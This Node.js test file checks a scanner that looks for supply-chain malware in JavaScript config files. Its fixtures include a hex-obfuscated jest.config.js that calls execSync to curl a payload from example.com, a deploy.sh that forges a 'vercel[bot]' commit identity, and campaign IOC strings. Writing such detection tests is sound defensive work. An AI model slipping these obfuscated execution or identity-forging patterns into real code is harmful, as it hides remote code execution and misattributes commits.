#!/usr/bin/env node
'use strict';

const path = require('path');
const fs = require('fs');
const os = require('os');
const { scan } = require('./scanner');
const { loadRuleset, listBuiltinRulesets, applyRulesetContent, applyRulesetFilename } = require('./rules');
const { formatJson, formatText } = require('./formatter');
const { shannonEntropy } = require('./rules/generic');

let passed = 0;
let failed = 0;

function assert(condition, name) {
  if (condition) {
    passed++;
    console.log(`  \x1b[32mPASS\x1b[0m ${name}`);
  } else {
    failed++;
    console.log(`  \x1b[31mFAIL\x1b[0m ${name}`);
  }
}

// ─── Setup: create a temp directory with test fixtures ──────────────────────

const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'config-check-test-'));

function writeFixture(name, content) {
  fs.writeFileSync(path.join(tmpDir, name), content);
}

// Clean config file
writeFixture('postcss.config.js', 'module.exports = {};\n');

// Obfuscated config — hex escapes
writeFixture('next.config.js', `
module.exports = {
  output: \\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65
};
`.replace(/\\\\/g, '\\'));

// Obfuscated config — hex variable names
writeFixture('rollup.config.js', `
var _0x4a2b = "test";
var _0x8f3c = _0x4a2b;
var _0xde91 = _0x8f3c;
var _0xab12 = _0xde91;
module.exports = {};
`);

// Obfuscated config — high entropy line (realistic obfuscator output)
writeFixture('jest.config.js',
  'var _0xf=["\\x63\\x68\\x69\\x6c\\x64","\\x70\\x72\\x6f\\x63\\x65\\x73\\x73"];' +
  'var _0xa=[_0xf[0]+\'_\'+_0xf[1]];var _0xb=require(_0xa[0]);' +
  '_0xb["\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63"]("\\x63\\x75\\x72\\x6c\\x20' +
  '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65' +
  '\\x2e\\x63\\x6f\\x6d\\x2f\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64");\n');

// Suspicious import in config
writeFixture('vite.config.js', `
const { createRequire } = require('module');
module.exports = {};
`);

// Trailing whitespace payload
writeFixture('tailwind.config.js', 'module.exports = {};' + ' '.repeat(80) + '\n');

// Known IOC string
writeFixture('app.js', 'const x = "8-404-2";\n');

// Blockchain API in config (now only caught by iocRuleset ruleset, not generic)
writeFixture('webpack.config.js', `
module.exports = {
  devServer: { proxy: 'https://trongrid.io/api' }
};
`);

// Forged identity script
writeFixture('deploy.sh', `
GIT_COMMITTER_NAME="vercel[bot]"
GIT_COMMITTER_DATE="2025-01-01"
GIT_AUTHOR_NAME="bot"
git commit --amend
`);

// Suspicious batch file
writeFixture('temp_auto_push.bat', 'echo hello\n');

// Clean JS file (should produce no findings)
writeFixture('index.js', 'console.log("hello world");\n');

// Global marker in config
writeFixture('babel.config.js', `
global['!'] = true;
module.exports = {};
`);

// Inline suppression test
writeFixture('commitlint.config.js', `
const { createRequire } = require('module'); // guardian-ignore
module.exports = {};
`);

// guardian-ignore-next-line test
writeFixture('prettier.config.js', `
// guardian-ignore-next-line
global['!'] = true;
module.exports = {};
`);

// ─── Test: obfuscation detection ────────────────────────────────────────────

console.log('\nObfuscation detection:');

const { findings: genericFindings, stats } = scan(tmpDir, { rulesets: [] });

assert(stats.filesScanned > 0, `scanned ${stats.filesScanned} files`);

assert(
  genericFindings.some(f => f.rule === 'OBFUSCATED_CONFIG' && f.file.includes('next.config.js')),
  'detects hex escape obfuscation in config'
);
assert(
  genericFindings.some(f => f.rule === 'OBFUSCATED_CONFIG' && f.file.includes('rollup.config.js')),
  'detects hex variable name obfuscation in config'
);
assert(
  genericFindings.some(f => f.rule === 'OBFUSCATED_CONFIG' && f.file.includes('jest.config.js')),
  'detects high-entropy line in config'
);
assert(
  !genericFindings.some(f => f.rule === 'CONFIG_SIZE_ANOMALY'),
  'size-based rule no longer exists'
);
assert(
  !genericFindings.some(f => f.rule === 'LONG_LINE_CONFIG'),
  'long-line rule no longer exists'
);

// ─── Test: generic rules ────────────────────────────────────────────────────

console.log('\nGeneric rules:');

assert(
  genericFindings.some(f => f.rule === 'SUSPICIOUS_IMPORT' && f.file.includes('vite.config.js')),
  'detects suspicious import (createRequire) in config'
);
assert(
  genericFindings.some(f => f.rule === 'TRAILING_WHITESPACE_PAYLOAD' && f.file.includes('tailwind.config.js')),
  'detects trailing whitespace payload'
);
assert(
  genericFindings.some(f => f.rule === 'FORGED_BOT_IDENTITY' && f.file.includes('deploy.sh')),
  'detects forged bot identity script'
);
assert(
  genericFindings.some(f => f.rule === 'SUSPICIOUS_BATCH_FILE' && f.file.includes('temp_auto_push.bat')),
  'detects suspicious batch file'
);
assert(
  genericFindings.some(f => f.rule === 'GLOBAL_CAMPAIGN_MARKER' && f.file.includes('babel.config.js')),
  'detects global campaign marker in config'
);
assert(
  !genericFindings.some(f => f.rule === 'BLOCKCHAIN_API_IN_CONFIG'),
  'blockchain API is no longer a generic rule (moved to supply-chain-iocs ruleset)'
);
assert(
  !genericFindings.some(f => f.file.includes('index.js')),
  'clean JS file produces no findings'
);
assert(
  !genericFindings.some(f => f.file.includes('postcss.config.js')),
  'clean config file produces no findings'
);

// ─── Test: inline suppression ───────────────────────────────────────────────

console.log('\nInline suppression:');

assert(
  !genericFindings.some(f => f.rule === 'SUSPICIOUS_IMPORT' && f.file.includes('commitlint.config.js')),
  'guardian-ignore suppresses finding on same line'
);
assert(
  !genericFindings.some(f => f.rule === 'GLOBAL_CAMPAIGN_MARKER' && f.file.includes('prettier.config.js')),
  'guardian-ignore-next-line suppresses finding on next line'
);

// ─── Test: ruleset loading ──────────────────────────────────────────────────

console.log('\nRuleset loading:');

const builtins = listBuiltinRulesets();
assert(builtins.includes('supply-chain-iocs'), 'lists supply-chain-iocs as built-in ruleset');

const iocRuleset = loadRuleset('supply-chain-iocs');
assert(iocRuleset.name === 'supply-chain-iocs', 'loads iocRuleset ruleset by name');
assert(Array.isArray(iocRuleset.rules) && iocRuleset.rules.length === 5, `iocRuleset ruleset has ${iocRuleset.rules.length} rules`);

// ─── Test: ruleset detection ────────────────────────────────────────────────

console.log('\nRuleset detection:');

const { findings: fullFindings } = scan(tmpDir, { rulesets: [iocRuleset] });

assert(
  fullFindings.some(f => f.rule === 'CAMPAIGN_IOC' && f.file.includes('app.js')),
  'iocRuleset ruleset detects "8-404-2" IOC in app.js'
);
assert(
  fullFindings.some(f => f.rule === 'CAMPAIGN_TOOLKIT' && f.file.includes('temp_auto_push.bat')),
  'iocRuleset ruleset detects toolkit filename'
);
assert(
  fullFindings.some(f => f.rule === 'CAMPAIGN_BLOCKCHAIN_API' && f.file.includes('webpack.config.js')),
  'iocRuleset ruleset detects blockchain API in config (moved from generic)'
);

// ─── Test: no-builtin scan ──────────────────────────────────────────────────

console.log('\nNo-builtin mode:');

const { findings: noBiFindings } = scan(tmpDir, { rulesets: [] });
assert(
  !noBiFindings.some(f => f.rule === 'CAMPAIGN_IOC'),
  'no CAMPAIGN_IOC findings without ruleset loaded'
);
assert(
  !noBiFindings.some(f => f.rule === 'CAMPAIGN_BLOCKCHAIN_API'),
  'no blockchain API findings without ruleset loaded'
);

// ─── Test: applyRulesetContent directly ─────────────────────────────────────

console.log('\nRuleset content matching:');

const contentFindings = applyRulesetContent(iocRuleset, 'test.js', 'test.js', 'const addr = "TMfKQEd7test"');
assert(
  contentFindings.some(f => f.rule === 'CAMPAIGN_WALLET'),
  'string-match detects wallet address substring'
);

const noMatch = applyRulesetContent(iocRuleset, 'test.js', 'test.js', 'const x = "hello world"');
assert(noMatch.length === 0, 'no false positives on clean content');

// ─── Test: applyRulesetFilename directly ────────────────────────────────────

console.log('\nRuleset filename matching:');

const fnFindings = applyRulesetFilename(iocRuleset, 'temp_auto_push.bat', 'temp_auto_push.bat');
assert(fnFindings.length > 0, 'filename-match catches toolkit file');

const fnClean = applyRulesetFilename(iocRuleset, 'index.js', 'index.js');
assert(fnClean.length === 0, 'filename-match ignores clean files');

// ─── Test: Shannon entropy function ─────────────────────────────────────────

console.log('\nShannon entropy:');

assert(shannonEntropy('aaaaaaaaaa') < 0.1, 'low entropy for repeated chars');
assert(shannonEntropy('abcdefghij') > 3.0, 'moderate entropy for unique chars');
const randomish = '!@#$%^&*()_+{}|:<>?~`1234567890abcdefghijklmnopqrstuvwxyzABCDEF';
assert(shannonEntropy(randomish) > 5.0, 'high entropy for mixed character classes');
assert(shannonEntropy('') === 0, 'zero entropy for empty string');

// ─── Test: formatter ────────────────────────────────────────────────────────

console.log('\nFormatter:');

const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, 'package.json'), 'utf8'));

const jsonOut = formatJson(fullFindings, stats, tmpDir);
const parsed = JSON.parse(jsonOut);
assert(parsed.version === pkg.version, `JSON output version matches package.json (${pkg.version})`);
assert(typeof parsed.summary.critical === 'number', 'JSON output has summary.critical');
assert(parsed.result === 'FAIL' || parsed.result === 'PASS', 'JSON output has result');

const textOut = formatText(fullFindings, stats, tmpDir, { noColor: true, rulesetNames: ['supply-chain-iocs'] });
assert(textOut.includes('guardian-config-check'), 'text output includes tool name');
assert(textOut.includes(`v${pkg.version}`), 'text output version matches package.json');
assert(textOut.includes('supply-chain-iocs'), 'text output includes ruleset name');
assert(textOut.includes('RESULT:'), 'text output includes result line');

// ─── Cleanup ────────────────────────────────────────────────────────────────

fs.rmSync(tmpDir, { recursive: true, force: true });

// ─── Summary ────────────────────────────────────────────────────────────────

console.log(`\n${passed + failed} tests: \x1b[32m${passed} passed\x1b[0m${failed > 0 ? `, \x1b[31m${failed} failed\x1b[0m` : ''}\n`);
process.exit(failed > 0 ? 1 : 0);
